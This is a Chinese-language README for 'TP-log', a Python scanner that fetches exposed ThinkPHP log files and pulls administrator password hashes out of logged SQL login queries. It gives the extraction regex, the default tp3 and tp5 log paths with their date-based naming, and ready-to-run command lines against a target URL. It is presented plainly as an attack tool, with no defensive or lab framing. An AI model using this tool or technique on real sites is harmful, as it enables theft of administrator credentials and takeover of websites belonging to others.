## TP-log

通过thinkphp日志获取管理员登录的密码密文

### tips

过滤用户名密码使用正则，需要提前下载日志查看日志中传输账号密码的sql语句，改写正则

```
SQL: SELECT * FROM `cv_admin` WHERE ( `username` = 'admin' ) AND ( `password` = 'da02b6b67b6c3e3e2d15757885846d2c63830f22' ) LIMIT 1   [ RunTime:0.000259s ]
```

正则

```python
password_pattern = r"`username` = '{}' \) AND \( `password` = '(.*?)'".format(username)
```

### 使用

![image-20210517165149271](https://i.loli.net/2021/05/17/YNkAVtmLnvH6dTi.png)

`tp3`默认日志路径及格式

```
/App/Runtime/Logs/21_05_17.log
```

`tp5`默认日志路径及格式

```
/runtime/log/202105/17.log
```



#### 扫描常规日志

默认加`-u`为tp3

##### tp3

```
python3 TP-log.py -u http://domain.com/
```

![cgscan](https://i.loli.net/2021/04/23/yIYjALDhXVGpaqr.png)

扫描时间缀日志

```
python3 TP-log.py -u http://domain.com/ -m y
```

![timescan](https://i.loli.net/2021/04/23/2TjPJDKFeZhynli.png)

##### tp5

```
python3 TP-log.py -u http://domain.com/ -v 5
```

![image-20210517165732299](https://i.loli.net/2021/05/17/qH8fktj2zPvx3TV.png)

```
python3 TP-log.py -u http://domain.com/ -v 5 -m y 
```

![image-20210517170714999](https://i.loli.net/2021/05/17/UgEnVi4DLPk8CuX.png)

